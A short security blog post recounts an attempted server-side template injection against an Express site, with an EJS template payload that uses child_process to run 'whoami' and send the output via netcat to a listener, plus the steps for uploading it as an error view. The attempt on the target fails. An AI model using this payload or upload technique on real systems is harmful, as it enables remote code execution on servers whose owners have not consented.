---
layout: post
title:  "An unsuccessful expressjs SSTI story"
tags: [ssti,expressjs]
---

## Recon
Response Header `x-powered-by: express`.  An expressjs website.

modify a request packet in burp. We get an error.
`Failed to lookup view "error" in views directory /[redacted]/[dir]` 

We get the dir of the view. And you can upload arbitrary file to the website.

## Can we SSTI

At first, I want to upload a normal shell. It can't be executed.
After I got the error message, I thought maybe we can upload a view file. And then we trigger the error request. Express will look up for the error view which is uploaded by us. So what can we do ?

After reading the Jade technique[1], I think we can use ssti to get a shell.

First we setup the enviroment. Then we get the examples[2] running.

404.ejs
```
<% include error_header %>
<h2>Cannot find <%= url %></h2>
<% include footer %>
```
So we can put nodejs code between `<%` and `%>`.
We use the code from the Jade example. Modify it to adjust the ejs template engine.


```
<% include error_header %>
<h2>Cannot find <%= url %></h2>
<% include footer %>

<% var x = process.mainModule.require;
x = x('child_process'); 
x.exec('whoami | nc 127.0.0.1 8080');
%>
```

Then we listen on port 8080 with python. Visiting the 404 url, we get the name on the python terminal. So we can use template to inject nodejs code, then we can get a shell.

Because `require` is not a global variable, we need to use `process.mainModule.require` to get it. The rest is normal nodejs code. `require('child_process').exec('whoami')`

I upload the file with the name 'error.ejs'. We don't get anything.

I thought maybe the extension is not 'ejs'. Because you can define it in the code.
I tried `.jade` and `.html`. Still we get nothing.

Because the dir is not public, I can't confirm whether it has been uploaded sucessfully or not. 

So this is an unscucessful expressjs SSTI story. But I learned that we can do SSTI in expressjs+ejs too.


[1] [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)  
[2] [Expressjs  error pages example](https://github.com/expressjs/express/tree/master/examples/error-pages)
